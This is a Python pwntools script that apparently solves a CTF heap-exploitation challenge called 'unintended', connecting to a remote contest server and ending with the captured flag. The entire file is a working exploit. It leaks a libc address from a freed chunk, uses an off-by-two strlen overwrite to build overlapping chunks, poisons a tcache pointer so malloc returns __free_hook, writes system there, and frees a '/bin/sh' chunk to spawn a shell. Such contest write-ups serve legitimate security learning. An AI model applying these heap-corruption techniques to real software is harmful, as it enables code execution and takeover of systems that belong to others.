#!/usr/bin/python

from pwn import *

# p= process('./unintended')
p =remote('193.57.159.27',52018)

# pid = gdb.attach(p,gdbscript='''
# 	b * menu
# 	''')



#Helper functions
def make_challenge(index,category,name,desc_len,desc,points):

	p.sendlineafter('> ','1')
	p.sendlineafter('number: ',str(index))
	p.sendlineafter('category: ',category)
	p.sendlineafter('name: ',name)
	p.sendlineafter('length: ',str(desc_len))
	p.sendlineafter('description: ',desc)
	p.sendlineafter('Points: ',str(points))


def patch_challenge(index,desc):

	p.sendlineafter('> ','2')
	p.sendlineafter('number: ',str(index))
	p.sendafter('description: ',desc)


def deploy_challenge(index):

	p.sendlineafter('> ','3')
	p.sendlineafter('number: ',str(index))

def take_down_challenge(index):

	p.sendlineafter('> ','4')
	p.sendlineafter('number: ',str(index))


def leak():	

	#Target for leak
	make_challenge(0,'AAAAAAAA','BBBBBBBB',2000,'CCCCCCC|',100)

	#Holder for top chunk not to consolidate
	make_challenge(1,'AAAAAAAA','BBBBBBBB',10,'CCCCCCC|',100)

	#Free target
	take_down_challenge(0)

	#Put the same chunk on the same place but only overwrite 8 bytes of fp to get printf to printout bk's address
	make_challenge(0,'AAAAAAAA','BBBBBBBB',2000,'CCCCCCC|',100)

	#View the leak
	deploy_challenge(0)

	#Parse the leak
	p.recvuntil('|')
	leak = u64(p.recv(6).ljust(8,'\0'))

	print hex(leak)
	return leak

def code_redirect(where,what):

	#Target for off by 2 attack fill it up with data so we can attack strlen later
	make_challenge(2,'AAAAAAAA','BBBBBBBB',2000,'C'*2000,100)

	#Target for overlapping chunk attack 
	make_challenge(3,'AAAAAAAA','BBBBBBBB',10,'CCCCCCC|',100)

	#Holder not to consolidate with top chunk
	make_challenge(5,'AAAAAAAA','BBBBBBBB',10,'CCCCCCC|',100)

	#Free target for overlap to put it in unsorted bin to trigger consolidation
	take_down_challenge(2)

	#Put half the size chunk in the same address as [2] and fill it up to overwrite bk and fp so there is no nullbytes
	#Important for strlen
	make_challenge(2,'web','before',1000,'X'*50,100)

	#Strlen will return size+2 (2 for the size in the header of the blob in unsorted bin since there are no \0 in body)
	#We use that to overwrite the size of this free chunk to make it larger(wi will use that to overwrite freed chunks later)
	patch_challenge(2,'\0'*0x3e8 + '\xff\x05')

	#We allocate the descrption chunk large enough to get unsorted bin blob pointing just above [3] so next time we allocate a chunk we will be
	#Able to overwrite [3] fd pointer to redirect code
	#We also set the name of the chunk to /bin/sh\0 to free it later when we overwrite free_hook
	make_challenge(4,'/bin/sh\0','after',0x380,'D'*50,100) #B1
	
	#Free the chunk to get it into Tcache bin, we will now allocate another chunk and overwrite this chunks fd pointer and trigger a chain reaction
	#That leads to forcing malloc to return arbitrary pointer
	take_down_challenge(3)
	
	#Allocate another chunk that overlaps with [3], now we are able to overwrite [3] fd pointer with whatever we want, i chose __free_hook
	make_challenge(7,'DDDDDDDD','EEEEEEEE',150,'FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'+p64(where),100)
	
	#We malloc 2 more chunks and in the second one will be allocated onto _free_hook, so we write there
	make_challenge(8,'AAAAAAAA','BBBBBBBB',10,'C',100)
	make_challenge(9,'AAAAAAAA','BBBBBBBB',10,p64(what),100)
	
	#Remember the chunk before whos name we set to /bin/sh\0 ? well this is how we get a shell, we free that chunk after having overwritten
	#__free_hook with system
	take_down_challenge(4)
	


def exploit():
	libc_leak = leak()
	
	libc_base = libc_leak -0x3ebc0a
	
	free_hook = libc_base +0x0000000003ed8e8

	one_gadget = libc_base +0x10a41c
	
	one_gadget1 = libc_base +0x4f432

	one_gadget2 = libc_base +0x4f3d5
	system = libc_base +0x00000000004f550
	
	#Logging
	print 'libc base: ',hex(libc_base)
	print 'free hook: ',hex(free_hook)
	print 'one gadget: ',hex(one_gadget2)
	print 'system: ',hex(system)

	#we will write addr of system on __free_hook
	code_redirect(free_hook, system)

if __name__ == '__main__':
	exploit()
	p.interactive()
	#rarctf{y0u_b3tt3r_h4v3_us3d_th3_int3nd3d...89406fae76}